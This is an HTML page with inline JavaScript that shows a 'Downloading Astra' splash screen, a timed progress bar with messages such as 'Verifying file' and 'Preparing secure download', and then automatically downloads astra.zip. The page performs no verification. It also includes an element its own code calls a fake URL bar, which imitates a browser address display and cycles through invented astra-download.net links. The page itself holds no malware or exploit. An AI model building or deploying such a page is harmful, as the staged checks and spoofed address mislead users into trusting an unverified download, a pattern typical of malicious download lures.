<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Downloading Astra</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}

body{
  background:#0b0b0b;
  color:#fff;
  font-family:'DM Sans',sans-serif;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  overflow:hidden;
  position:relative;
}

/* Background Grid */
body::before{
  content:'';
  position:fixed;inset:0;
  background-image:
    linear-gradient(rgba(255,255,255,0.025) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,0.025) 1px, transparent 1px);
  background-size:64px 64px;
  pointer-events:none;
}

/* Center Content */
.wrap{
  display:flex;flex-direction:column;align-items:center;
  text-align:center;gap:0;position:relative;z-index:1;
  padding:24px;
}

/* Logo Animation */
.logo-wrap{
  position:relative;
  width:128px;height:128px;
  display:flex;align-items:center;justify-content:center;
  margin-bottom:44px;
}

.logo-glow{
  position:absolute;inset:0;
  border-radius:50%;
  background:radial-gradient(circle, rgba(255,255,255,0.12) 0%, transparent 65%);
  animation:glowPulse 2.2s ease-in-out infinite;
}

@keyframes glowPulse{
  0%,100%{transform:scale(1);opacity:.7}
  50%{transform:scale(1.18);opacity:1}
}

.ring{
  position:absolute;inset:0;
  border-radius:50%;
  border:1px solid rgba(255,255,255,0.18);
  animation:ringExpand 2.2s ease-out infinite;
}
.ring:nth-child(3){animation-delay:.9s;opacity:.5}

@keyframes ringExpand{
  0%{transform:scale(.7);opacity:.8}
  100%{transform:scale(1.6);opacity:0}
}

.logo-img{
  width:80px;height:80px;object-fit:contain;
  position:relative;z-index:2;
  filter:drop-shadow(0 0 16px rgba(255,255,255,0.5)) drop-shadow(0 0 32px rgba(255,255,255,0.2));
  animation:logoGlow 2.2s ease-in-out infinite;
}

@keyframes logoGlow{
  0%,100%{filter:drop-shadow(0 0 16px rgba(255,255,255,0.5)) drop-shadow(0 0 32px rgba(255,255,255,0.2))}
  50%{filter:drop-shadow(0 0 28px rgba(255,255,255,0.9)) drop-shadow(0 0 56px rgba(255,255,255,0.35))}
}

/* Messages */
.msg-area{
  height:48px;display:flex;align-items:center;justify-content:center;
  margin-bottom:28px;width:340px;max-width:88vw;overflow:hidden;position:relative;
}

.msg{
  font-family:'Syne',sans-serif;font-weight:700;
  font-size:clamp(1rem,4vw,1.25rem);
  letter-spacing:0.04em;color:#fff;
  position:absolute;opacity:0;transform:translateY(12px);
  transition:opacity .4s ease,transform .4s ease;
  white-space:nowrap;
}
.msg.show{opacity:1;transform:translateY(0)}
.msg.hide{opacity:0;transform:translateY(-12px)}

/* Progress */
.progress-track{
  width:280px;max-width:80vw;height:3px;
  background:rgba(255,255,255,0.08);border-radius:3px;
  overflow:hidden;margin-bottom:12px;
}
.progress-fill{
  height:100%;background:linear-gradient(90deg, #fff, #aaa);
  width:0%;transition:width .8s cubic-bezier(0.4, 0, 0.2, 1);
}

.pct{
  font-family:'Syne',sans-serif;font-size:0.68rem;font-weight:700;
  letter-spacing:0.2em;color:rgba(255,255,255,0.4);
}

/* Fake URL Bar */
.fake-url{
  position:fixed;
  bottom:30px;
  left:50%;
  transform:translateX(-50%);
  background:rgba(0,0,0,0.6);
  backdrop-filter:blur(8px);
  padding:8px 18px;
  border-radius:30px;
  font-size:0.78rem;
  font-family:monospace;
  color:#0f0;
  white-space:nowrap;
  border:1px solid rgba(255,255,255,0.1);
  box-shadow:0 4px 15px rgba(0,0,0,0.5);
}
</style>
</head>
<body>

<div class="wrap">
  <div class="logo-wrap">
    <div class="logo-glow"></div>
    <div class="ring"></div>
    <div class="ring"></div>
    <img class="logo-img" src="logo.png" alt="Astra"
         onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 80 80%22><text y=%2260%22 font-size=%2256%22 fill=%22white%22>✦</text></svg>'"/>
  </div>

  <div class="msg-area">
    <div class="msg show" id="m0">Preparing secure download...</div>
    <div class="msg" id="m1">Connecting to server</div>
    <div class="msg" id="m2">Verifying file</div>
    <div class="msg" id="m3">Downloading Astra...</div>
    <div class="msg" id="m4">Almost ready!</div>
  </div>

  <div class="progress-track">
    <div class="progress-fill" id="bar"></div>
  </div>
  <div class="pct" id="pct">0%</div>
</div>

<div class="fake-url" id="fakeurl">astra-download.net/verify?v=9377ee10</div>

<script>
// CONFIG
const FILE_NAME = "astra.zip";   // Change to your actual file name

const steps = [
  {id:'m0', p:15,  t:0},
  {id:'m1', p:42,  t:1400},
  {id:'m2', p:67,  t:2800},
  {id:'m3', p:89,  t:4200},
  {id:'m4', p:100, t:5500},
];

const bar = document.getElementById('bar');
const pct = document.getElementById('pct');
const fakeurl = document.getElementById('fakeurl');

let urls = [
  "astra-download.net/verify?v=9377ee10",
  "astra-download.net/session/ak392",
  "astra-download.net/file/secure/ Astra",
  "astra-download.net/dl?id=8xK9pM",
  "astra-download.net/processing",
  "astra-download.net/finalize?v=3928"
];

function setProgress(v) {
  bar.style.width = v + '%';
  pct.textContent = v + '%';
}

// Fake URL Changer
function changeFakeURL() {
  setInterval(() => {
    const randomURL = urls[Math.floor(Math.random() * urls.length)];
    fakeurl.textContent = randomURL;
  }, 1800); // Changes every 1.8 seconds
}

// Start Animation
steps.forEach((step, i) => {
  setTimeout(() => {
    // Hide previous message
    if (i > 0) {
      const prev = document.getElementById(steps[i-1].id);
      prev.classList.remove('show');
      prev.classList.add('hide');
    }
    
    // Show current message
    document.getElementById(step.id).classList.add('show');
    setProgress(step.p);

    // Final step → Download
    if (i === steps.length - 1) {
      setTimeout(() => {
        const a = document.createElement('a');
        a.href = FILE_NAME;
        a.download = FILE_NAME;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      }, 800);
    }
  }, step.t);
});

changeFakeURL();
</script>
</body>
</html>
